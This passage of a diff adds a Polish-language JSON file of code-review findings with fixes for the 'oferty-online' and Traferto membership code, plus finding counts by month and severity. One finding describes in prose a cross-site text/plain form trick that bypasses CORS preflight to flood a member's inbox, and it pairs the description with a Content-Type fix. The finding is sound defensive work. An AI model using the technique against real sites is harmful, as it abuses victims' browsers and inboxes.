+   "typ": "KOD",
+   "plik": "backend/services/traferto_membership.py:125",
+   "opis": "`_classify` uznaje sukces wyłącznie przy `http_status == 200`, choć `send_webhook_json` ustawia `error=None` dla każdego 2xx (`response.is_success`). Odpowiedź `201`/`202`/`204` (np. po zmianie handlera w Traferto albo przez proxy) wpadnie w gałąź `retryable`: 60 s uśpienia, drugi identyczny POST i finalnie `logger.error('traferto_membership_failed')` mimo że push się udał. Zamień warunek w linii 125 na `if result.error is None: return \"success\"` (bez sprawdzania `http_status == 200`) — sender już rozróżnia 2xx od reszty przez pole `error`."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/webhooks/payload.ts:27",
+   "opis": "`WEBHOOK_PAYLOAD_VERSION = 1` istnieje teraz w dwóch miejscach: tutaj (faza 6) i w `packages/shared/src/webhook-contract.ts:365` (nowa kopia z tej fazy), a równość obu jest dziś potwierdzona wyłącznie zdaniem w planie — nic jej nie strzeże, więc podbicie wersji po jednej stronie rozjedzie schemat walidacji z realnym ładunkiem cicho. Skasuj lokalny literał i zastąp go re-eksportem z kontraktu: `export { WEBHOOK_PAYLOAD_VERSION } from '@oferty/shared';` (serwer już importuje ten pakiet), zostawiając użycia w liniach 45 i 76 bez zmian."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/routes/access.ts:201",
+   "opis": "readCanonicalEmail parsuje cialo JSON.parse bez sprawdzenia Content-Type, wiec formularz cross-site z enctype text/plain (nazwa pola = poczatek JSON-a z adresem ofiary, wartosc = domkniecie obiektu) sklada poprawny JSON i wysyla zadanie BEZ preflightu CORS: przegladarki odwiedzajacych strone atakujacego staja sie rozproszonym zrodlem IP dla wiadra 5/min (bombardowanie skrzynki czlonka linkami rejestracji). Przed readLimitedBody dodaj bramke: jesli (context.req.header('content-type') ?? '').toLowerCase() nie zaczyna sie od application/json, zwroc { kind: 'response', response: jsonError(context, HTTP_STATUS_BAD_REQUEST, 'nieprawidlowy_adres', TEXTS.badRequest) } (wspolna funkcja obejmie oba PO"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "supabase/tests/rls.test.ts:6350",
+   "opis": "`hashesOfEligible` liczy hash inline (`createHash('sha256').update(email.trim().toLowerCase())`) — trzecia kopia kryterium D2 w repo, mimo że ten sam plik importuje już `hashEmail` z `apps/server/src/access/email-hash`. Zamień mapowanie na `.map((email) => hashEmail(email))`, żeby test seedujący listę nie rozjechał się cicho z produkcyjnym wzorem (learned-patterns 2026-09-11: bramka-regexp/wzór ma jedną kopię także w testach)."
+  }
+ ],
+ "obalone_wszystkie": [],
+ "potwierdzone_per_miesiac": {
+  "2026-09": 174,
+  "2026-08": 91
+ },
+ "potwierdzone_per_severity": {
+  "P2": 122,
+  "P3": 134,
+  "P1": 9
+ }
+}
